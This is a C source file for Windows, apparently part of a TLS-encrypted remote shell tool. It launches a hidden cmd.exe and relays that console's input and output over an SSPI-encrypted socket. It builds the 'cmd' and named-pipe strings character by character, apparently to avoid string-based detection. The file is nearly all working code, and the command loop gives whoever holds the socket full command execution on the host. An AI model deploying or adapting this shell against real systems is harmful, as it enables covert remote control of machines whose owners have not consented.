/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "tlscmd.h"
  
#define R_PIPE 0
#define W_PIPE 1

#define SOCKET_EVENT  0
#define STDOUT_EVENT  1
#define PROCESS_EVENT 2
  
typedef struct cmd_session_t {
  HANDLE in[2], out[2];
  HANDLE evt[4];
  DWORD  evt_cnt; 
} cmd_session;
  
DWORD wait_evt (tls_session *tls, cmd_session *cs)
{
  WSANETWORKEVENTS ne;
  u_long           opt;
  DWORD            e;
  
  // set to non-blocking mode
  WSAEventSelect (tls->sck, cs->evt[SOCKET_EVENT], FD_CLOSE | FD_READ);
  
  // wait for some event
  e = WaitForMultipleObjects (cs->evt_cnt, cs->evt, FALSE, INFINITE);

  // enumerate events
  WSAEnumNetworkEvents (tls->sck, cs->evt[SOCKET_EVENT], &ne);   
  
  // clear monitor  
  WSAEventSelect (tls->sck, cs->evt[SOCKET_EVENT], 0);
  
  // set socket to blocking mode
  opt=0;
  ioctlsocket (tls->sck, FIONBIO, &opt);
  
  // closed?
  if (ne.lNetworkEvents & FD_CLOSE) {
    e = ~0UL;
  }
  return e;
}

void cmd_loop(tls_ctx *ctx, tls_session *tls, cmd_session *cs)
{
  DWORD      e, len, p=0;
  OVERLAPPED lap;
  
  ZeroMemory (&lap, sizeof (lap));       
  lap.hEvent = cs->evt[STDOUT_EVENT];
          
  for (;;) 
  {
    e=wait_evt(tls, cs);

    if (e == PROCESS_EVENT) {
      DEBUG_PRINT ("  [ cmd.exe terminated\n");
      break;
    }
    
    if (e == -1) {
      DEBUG_PRINT ("  [ wait error\n");
      break;
    }

    // is this socket event?
    if (e == SOCKET_EVENT) 
    {
      if (tls_decrypt (ctx, tls) != SEC_E_OK) {
        DEBUG_PRINT ("tls decrypt error");
        break;
      }
      tls->buf[ctx->sizes.cbHeader + tls->buflen] = 0;
      DEBUG_PRINT ("\nwriting %s", &tls->buf[ctx->sizes.cbHeader]);
      WriteFile (cs->in[W_PIPE], tls->buf, tls->buflen, &len, 0);
      p--;  // we're ready to read again.              
    } else
   
    // data from cmd.exe?
    if (e == STDOUT_EVENT) 
    {
      if (p == 0)
      {
        ReadFile (cs->out[R_PIPE], &tls->buf[ctx->sizes.cbHeader], tls->maxlen, &tls->buflen, &lap);
        DEBUG_PRINT ("%i", GetLastError()); 
        p++;        
      } else {
        DEBUG_PRINT ("getting overlapped result");
        if (!GetOverlappedResult (cs->out[R_PIPE], &lap, &tls->buflen, FALSE)) {
          DEBUG_PRINT("overlapped error %i", GetLastError());
          // problem...
          break;
        }
        if (tls->buflen != 0)
        {
          //DEBUG_PRINT ("encrypting..");
          if (tls_encrypt(ctx, tls) != SEC_E_OK) {
            DEBUG_PRINT("tls encrypt error");            
            break;
          }
          //DEBUG_PRINT ("\nok");
          p--;
        }
      }
    }
  }
}
          
void tls_cmd (tls_ctx *ctx, tls_session *tls) 
{
  SECURITY_ATTRIBUTES sa;  
  STARTUPINFO         si;
  PROCESS_INFORMATION pi;  
  cmd_session         cs; 
  char                pname[32]; 
  DWORD               t, i;  
  char cmd[]={'c', 'm', 'd', '\0'};
  char pipe[] =
    { '\\','\\','.','\\','p','i','p','e','\\'};
    
  memset (pname, 0,   32);
  memcpy (pname, pipe, 9);
  
  // set last 8 bytes to something "unique"
  // which avoids issues with duplicate pipe names
  t=GetTickCount();
  for (i=0; i<8; i++) {
    pname[9+i] = (t % 26) + 'a';
    t >>= 2;
  }
  
  ctx->ss = ctx->sspi->
    QueryContextAttributes(&tls->ctx, 
        SECPKG_ATTR_STREAM_SIZES, (PVOID)&ctx->sizes);
    
  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;
  
  cs.evt[SOCKET_EVENT] = WSACreateEvent();
  cs.evt[STDOUT_EVENT] = CreateEvent (NULL, TRUE, TRUE, NULL);
  
  if (CreatePipe (&cs.in[R_PIPE], &cs.in[W_PIPE], &sa, 0)) 
  {  
    cs.out[R_PIPE] = CreateNamedPipe (pname, 
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE      | PIPE_READMODE_BYTE | PIPE_WAIT, 
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, &sa);
        
    if (cs.out[R_PIPE] != INVALID_HANDLE_VALUE) 
    {  
      cs.out[W_PIPE] = CreateFile (pname, GENERIC_WRITE, 
          0, &sa, OPEN_EXISTING, 
          FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 
          NULL);
      
      if (cs.out[W_PIPE] != INVALID_HANDLE_VALUE) 
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        SetHandleInformation (cs.in[W_PIPE],  HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation (cs.out[R_PIPE], HANDLE_FLAG_INHERIT, 0);
        
        si.cb              = sizeof (si);
        si.hStdInput       = cs.in[R_PIPE];
        si.hStdError       = cs.out[W_PIPE];
        si.hStdOutput      = cs.out[W_PIPE];
        si.dwFlags         = STARTF_USESTDHANDLES;
        
        if (CreateProcess (NULL, cmd, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) 
        {
          cs.evt[PROCESS_EVENT] = pi.hProcess;
          
          cs.evt_cnt = 3;
          
          cmd_loop(ctx, tls, &cs);
           
          TerminateProcess (pi.hProcess, 0);
          
          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
        }
        CloseHandle (cs.out[W_PIPE]);
      }
      CloseHandle (cs.out[R_PIPE]);
    }
    CloseHandle (cs.in[W_PIPE]);
    CloseHandle (cs.in[R_PIPE]);
  }
  CloseHandle (cs.evt[STDOUT_EVENT]);
}
